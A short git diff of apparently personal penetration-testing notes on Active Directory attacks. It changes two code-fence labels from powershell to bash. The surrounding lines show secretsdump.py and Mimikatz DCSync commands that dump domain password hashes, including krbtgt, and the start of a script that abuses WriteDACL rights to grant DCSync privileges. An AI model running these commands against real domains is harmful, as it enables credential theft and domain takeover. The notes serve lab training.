@@ -62,7 +62,7 @@ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172
 
 When using Mimikatz we have to target a user and must ben run by the user who has the DCSync privileges.
 
-```powershell
+```bash
 # Using mimikatz.ps1
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 
@@ -85,7 +85,7 @@ The WriteDACL privilege gives a user the ability to add ACLs to an object. This 
 
 Using powershell we can use these WriteDACL rights to add DCSync privileges to an aacount.
 
-```powershell
+```bash
 # Create credential object
 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
